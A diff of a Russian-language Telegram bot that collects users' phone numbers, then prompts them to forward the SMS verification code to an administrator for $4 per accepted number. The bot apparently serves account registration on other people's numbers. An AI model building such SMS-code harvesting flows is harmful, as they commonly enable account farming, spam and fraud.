@@ -31,13 +31,24 @@ async def init_db():
             )
         ''')
         
-        # Добавляем колонку waiting_for_number если её нет
+        # Добавляем колонку waiting_for_number
         await conn.execute('''
             DO $$ 
             BEGIN
                 IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
                               WHERE table_name='users' AND column_name='waiting_for_number') THEN
                     ALTER TABLE users ADD COLUMN waiting_for_number BOOLEAN DEFAULT FALSE;
+                END IF;
+            END $$;
+        ''')
+        
+        # Добавляем колонку waiting_for_sms
+        await conn.execute('''
+            DO $$ 
+            BEGIN
+                IF NOT EXISTS (SELECT 1 FROM information_schema.columns 
+                              WHERE table_name='users' AND column_name='waiting_for_sms') THEN
+                    ALTER TABLE users ADD COLUMN waiting_for_sms BOOLEAN DEFAULT FALSE;
                 END IF;
             END $$;
         ''')
@@ -233,6 +244,7 @@ async def timeout_waiting(user_id: int):
         row = await conn.fetchrow("SELECT waiting_for_number FROM users WHERE user_id = $1", user_id)
         if row and row["waiting_for_number"]:
             await conn.execute("UPDATE users SET waiting_for_number = FALSE WHERE user_id = $1", user_id)
+            await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
             await bot.send_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>", parse_mode="HTML")
 
 @dp.callback_query(F.data == "cancel_request")
@@ -261,6 +273,7 @@ async def handle_all_messages(message: types.Message):
         return
     
     async with db_pool.acquire() as conn:
+        # Проверяем ожидает ли пользователь номер
         row = await conn.fetchrow("SELECT waiting_for_number, username FROM users WHERE user_id = $1", user_id)
         
         if row and row["waiting_for_number"]:
@@ -291,67 +304,12 @@ async def handle_all_messages(message: types.Message):
             )
             
             await message.answer("<b>✅ Номер принят</b>\n<i>Ожидайте решения администратора</i>", parse_mode="HTML")
-
-@dp.callback_query(F.data.startswith("request_sms_"))
-async def request_sms(callback: types.CallbackQuery):
-    user_id = int(callback.data.split("_")[2])
-    async with db_pool.acquire() as conn:
-        await conn.execute("UPDATE requests SET status = 'waiting_sms' WHERE user_id = $1", user_id)
-    
-    keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Отменить", callback_data="cancel_sms")]
-    ])
-    
-    await bot.send_message(
-        user_id,
-        "<b>⏱️ Введите код из смс!</b>\n<i>Таймер на выполнение:</i> <code>1 мин</code>",
-        reply_markup=keyboard,
-        parse_mode="HTML"
-    )
-    
-    # Сохраняем в БД что ждем SMS
-    async with db_pool.acquire() as conn:
-        await conn.execute("UPDATE users SET waiting_for_sms = TRUE WHERE user_id = $1", user_id)
-    
-    asyncio.create_task(timeout_sms(user_id))
-    await callback.answer("Запрос отправлен")
-
-async def timeout_sms(user_id: int):
-    await asyncio.sleep(60)
-    async with db_pool.acquire() as conn:
-        row = await conn.fetchrow("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
-        if row and row["waiting_for_sms"]:
-            await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
-            await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
-            await bot.send_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>", parse_mode="HTML")
-
-@dp.callback_query(F.data.startswith("reject_"))
-async def reject_request(callback: types.CallbackQuery):
-    user_id = int(callback.data.split("_")[1])
-    async with db_pool.acquire() as conn:
-        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
-        await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
-    
-    await bot.send_message(
-        user_id,
-        "<b>🔐 Заявка отклонена!</b>\n<i>Причина: отклонена администрацией</i>",
-        parse_mode="HTML"
-    )
-    await callback.answer("Заявка отклонена")
-    await callback.message.delete_reply_markup()
-
-@dp.message()
-async def handle_sms_messages(message: types.Message):
-    user_id = message.from_user.id
-    text = message.text.strip()
-    
-    if text.startswith('/'):
-        return
-    
-    async with db_pool.acquire() as conn:
-        row = await conn.fetchrow("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
+            return
         
-        if row and row["waiting_for_sms"]:
+        # Проверяем ожидает ли пользователь SMS
+        sms_row = await conn.fetchrow("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
+        
+        if sms_row and sms_row["waiting_for_sms"]:
             await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
             
             sms_code = text
@@ -365,9 +323,9 @@ async def handle_sms_messages(message: types.Message):
             username = message.from_user.username or message.from_user.full_name
             
             keyboard = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="Номер встал", callback_data=f"accept_{user_id}_{sms_code}"),
-                 InlineKeyboardButton(text="Номер Зарегистрирован", callback_data=f"registered_{user_id}"),
-                 InlineKeyboardButton(text="Получена ошибка", callback_data=f"error_{user_id}")]
+                [InlineKeyboardButton(text="✅ Номер встал", callback_data=f"accept_{user_id}_{sms_code}"),
+                 InlineKeyboardButton(text="📝 Номер Зарегистрирован", callback_data=f"registered_{user_id}"),
+                 InlineKeyboardButton(text="❌ Получена ошибка", callback_data=f"error_{user_id}")]
             ])
             
             await bot.send_message(
@@ -379,6 +337,54 @@ async def handle_sms_messages(message: types.Message):
             
             await message.answer("<b>✅ Код отправлен администратору</b>", parse_mode="HTML")
 
+@dp.callback_query(F.data.startswith("request_sms_"))
+async def request_sms(callback: types.CallbackQuery):
+    user_id = int(callback.data.split("_")[2])
+    
+    async with db_pool.acquire() as conn:
+        await conn.execute("UPDATE requests SET status = 'waiting_sms' WHERE user_id = $1", user_id)
+        await conn.execute("UPDATE users SET waiting_for_sms = TRUE WHERE user_id = $1", user_id)
+    
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+        [InlineKeyboardButton(text="❌ Отменить", callback_data="cancel_sms")]
+    ])
+    
+    await bot.send_message(
+        user_id,
+        "<b>⏱️ Введите код из смс!</b>\n<i>Таймер на выполнение:</i> <code>1 мин</code>",
+        reply_markup=keyboard,
+        parse_mode="HTML"
+    )
+    
+    asyncio.create_task(timeout_sms(user_id))
+    await callback.answer("✅ Запрос отправлен")
+    await callback.message.delete_reply_markup()
+
+async def timeout_sms(user_id: int):
+    await asyncio.sleep(60)
+    async with db_pool.acquire() as conn:
+        row = await conn.fetchrow("SELECT waiting_for_sms FROM users WHERE user_id = $1", user_id)
+        if row and row["waiting_for_sms"]:
+            await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
+            await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
+            await bot.send_message(user_id, "<b>⏰ Время вышло. Заявка отменена</b>", parse_mode="HTML")
+
+@dp.callback_query(F.data.startswith("reject_"))
+async def reject_request(callback: types.CallbackQuery):
+    user_id = int(callback.data.split("_")[1])
+    
+    async with db_pool.acquire() as conn:
+        await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
+        await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
+    
+    await bot.send_message(
+        user_id,
+        "<b>❌ Заявка отклонена!</b>\n<i>Причина: отклонена администрацией</i>",
+        parse_mode="HTML"
+    )
+    await callback.answer("❌ Заявка отклонена")
+    await callback.message.delete_reply_markup()
+
 @dp.callback_query(F.data.startswith("accept_"))
 async def number_accepted(callback: types.CallbackQuery):
     parts = callback.data.split("_")
@@ -388,7 +394,7 @@ async def number_accepted(callback: types.CallbackQuery):
     async with db_pool.acquire() as conn:
         row = await conn.fetchrow("SELECT number FROM requests WHERE user_id = $1", user_id)
         if not row:
-            await callback.answer("Заявка не найдена")
+            await callback.answer("❌ Заявка не найдена")
             return
         
         number = row["number"]
@@ -403,33 +409,36 @@ async def number_accepted(callback: types.CallbackQuery):
         ''', user_id, username, number, request_number, int(time.time()))
         
         await conn.execute("UPDATE users SET balance = balance + 4.00 WHERE user_id = $1", user_id)
+        await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
     await bot.send_message(
         user_id,
         f"<b>🎉 Номер принят!</b>\n<i>Вам успешно</i> <code>4.0$</code> <i>на баланс</i>\n\n<i>Номер заявки:</i> <code>#{request_number}</code>",
         parse_mode="HTML"
     )
-    await callback.answer("Номер принят")
+    await callback.answer("✅ Номер принят")
     await callback.message.delete_reply_markup()
 
 @dp.callback_query(F.data.startswith("registered_"))
 async def number_registered(callback: types.CallbackQuery):
     user_id = int(callback.data.split("_")[1])
+    
     async with db_pool.acquire() as conn:
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
+        await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
     
     await bot.send_message(
         user_id,
-        "<b>🔐 Номер уже зарегистрирован!</b>\n<i>Ожидайте создания следующей заявки в канале</i>",
+        "<b>📝 Номер уже зарегистрирован!</b>\n<i>Ожидайте создания следующей заявки в канале</i>",
         parse_mode="HTML"
     )
-    await callback.answer("Номер зарегистрирован")
+    await callback.answer("📝 Номер зарегистрирован")
     await callback.message.delete_reply_markup()
 
 @dp.callback_query(F.data.startswith("error_"))
 async def got_error(callback: types.CallbackQuery):
     user_id = int(callback.data.split("_")[1])
-    await callback.message.answer("<b>Введите причину ошибки:</b>", parse_mode="HTML")
+    await callback.message.answer("<b>❓ Введите причину ошибки:</b>", parse_mode="HTML")
     await callback.answer()
     
     @dp.message
@@ -439,9 +448,11 @@ async def got_error(callback: types.CallbackQuery):
         reason = message.text
         async with db_pool.acquire() as conn:
             await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
+            await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
+        
         await bot.send_message(
             user_id,
-            f"<b>🔐 {reason}</b>",
+            f"<b>❌ {reason}</b>",
             parse_mode="HTML"
         )
         await message.answer("<b>✅ Причина отправлена</b>", parse_mode="HTML")
@@ -450,12 +461,13 @@ async def got_error(callback: types.CallbackQuery):
 @dp.callback_query(F.data == "cancel_sms")
 async def cancel_sms(callback: types.CallbackQuery):
     user_id = callback.from_user.id
+    
     async with db_pool.acquire() as conn:
         await conn.execute("UPDATE users SET waiting_for_sms = FALSE WHERE user_id = $1", user_id)
         await conn.execute("DELETE FROM requests WHERE user_id = $1", user_id)
     
     await callback.message.answer("<b>❌ Заявка отменена</b>", parse_mode="HTML")
-    await callback.answer()
+    await callback.answer("❌ Отменено")
 
 async def main():
     await init_db()
